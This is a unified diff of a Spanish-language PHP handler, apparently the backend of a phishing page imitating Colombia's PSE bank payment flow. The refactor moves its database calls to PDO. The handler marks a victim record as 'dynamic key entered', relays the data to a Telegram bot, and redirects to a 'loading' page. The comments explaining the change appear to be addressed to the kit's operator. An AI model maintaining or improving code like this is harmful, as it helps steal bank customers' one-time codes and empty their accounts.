@@ -1,8 +1,12 @@
 <?php
+// No necesitas iniciar session_start() aquí si no usas variables $_SESSION
+// session_start(); 
+
+// Estos includes están correctos. $conn es un objeto PDO.
 include '../../../../assets/config/conexion.php';
 $config = include '../../../../assets/config/config.php';
 
-// Función para escapar caracteres especiales en MarkdownV2
+// Función para escapar caracteres especiales en MarkdownV2 (Sin cambios)
 function escapeMarkdownV2($text) {
     $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
     foreach ($specialChars as $char) {
@@ -19,14 +23,26 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         die("Error: Todos los campos son obligatorios.");
     }
 
-    // Actualizar solo el estado en la base de datos
+    // --- SECCIÓN DE BASE DE DATOS ADAPTADA A PDO ---
+    
     $estado = 5; // Estado: Clave dinámica ingresada
     $sql = "UPDATE pse SET estado = ? WHERE id = ?";
-    $stmt = $conn->prepare($sql);
-    $stmt->bind_param("ii", $estado, $cliente_id);
+    
+    try {
+        // 1. Preparamos la consulta
+        $stmt = $conn->prepare($sql);
+        
+        // 2. Ejecutamos la consulta pasando los valores en un array.
+        //    Esto reemplaza a bind_param() y execute().
+        //    El orden importa: [valor para el 1er ?, valor para el 2do ?]
+        $stmt->execute([$estado, $cliente_id]);
 
-    if ($stmt->execute()) {
-        // Enviar datos a Telegram - ACTUALIZADO para coincidir con tu config.php
+        // Si llegamos aquí, la actualización fue exitosa.
+
+        // --- FIN DE LA SECCIÓN ADAPTADA ---
+
+
+        // Enviar datos a Telegram (Sin cambios)
         $botToken = $config['telegram']['bot_token'];
         $chatId = $config['telegram']['chat_id'];
         $baseUrl = $config['base_url'];
@@ -73,14 +89,18 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             die('Error al enviar mensaje a Telegram');
         }
 
-        // Redirigir a la página cargando.php con el ID del cliente
+        // Redirigir a la página cargando.php con el ID del cliente (Sin cambios)
         header("Location: ../cargando.php?id=" . $cliente_id);
         exit();
-    } else {
-        echo "Error al actualizar el estado: " . $stmt->error;
-    }
 
-    $stmt->close();
-    $conn->close();
+    } catch (PDOException $e) {
+        // 3. Manejo de errores de PDO
+        //    Esto reemplaza a "echo $stmt->error"
+        error_log("Error al actualizar BBDD: " . $e->getMessage());
+        die("Error al actualizar el estado. Por favor, intente más tarde.");
+    }
+    
+    // 4. No necesitas $stmt->close() ni $conn->close() con PDO de esta manera.
+    //    PHP se encarga de cerrar la conexión al final del script.
 }
 ?>
